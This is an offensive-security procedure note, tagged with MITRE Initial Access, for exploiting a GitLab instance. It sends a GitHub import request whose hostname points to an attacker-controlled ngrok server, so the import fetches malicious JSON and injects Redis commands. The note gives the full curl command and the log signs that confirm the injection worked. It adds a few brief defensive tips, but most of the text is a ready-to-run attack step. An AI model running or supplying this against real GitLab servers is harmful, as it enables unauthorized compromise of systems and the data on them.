---
tags:
  - import-trigger
  - api-request
  - gitlab
type: procedure
tools:
  - '[[tools/Ruby]]'
  - '[[tools/Flask]]'
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: ad9c65c9-6181-4dc8-b974-c414b881d7bd
created_at: '2025-12-11T03:48:06.040Z'
updated_at: '2025-12-11T03:48:06.040Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
mitre_techniques:
  - '[[T1190]]'
---
# Initiate GitHub Repository Import on GitLab

## Summary

This procedure initiates a GitHub repository import on GitLab, pointing to a fake server to trigger the vulnerability and inject Redis commands.

## Description

By sending a POST request to GitLab's /api/v4/import/github endpoint with a fake hostname, the import process fetches malicious JSON from the fake server, leading to Redis injection. Monitor logs for confirmation.

## Requirements

1. GitLab API token
2. Fake server running and ngrok URL
3. Access to GitLab instance

## Defense

Defensive measures and detection strategies:

- Validate import hostnames against allowlists
- Monitor API logs for unusual import requests
- Rate-limit import attempts

## Objectives

1. Trigger vulnerable import code path
2. Inject malicious Redis commands
3. Confirm injection via logs

## Instructions

### Step 1: Send Import Request

**Context**: POST to GitLab API with fake details.

**Command** ([[commands/curl-initiate-github-import]]):
```bash
curl --request POST --url "http://gitlab.wbowling.info/api/v4/import/github"  --header "content-type: application/json" --header "PRIVATE-TOKEN: API_TOKEN" --data "{\"personal_access_token\": \"fake_token\",\"repo_id\": \"12345\",\"target_namespace\": \"root\",\"new_name\": \"gh-import-$RANDOM\",\"github_hostname\": \"https://9895-45-248-49-157.ngrok.io\"}"
```

> This starts the import and triggers the injection.

### Step 2: Monitor Logs

**Context**: Wait and check for requests and errors.

No command; observe Flask logs and GitLab exceptions_json.log for 'comparison of String with 0 failed'.

> Injection successful if error appears.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/curl-initiate-github-import]]

## Tools Used

- #curl

## Tags

- #import-trigger
- #gitlab
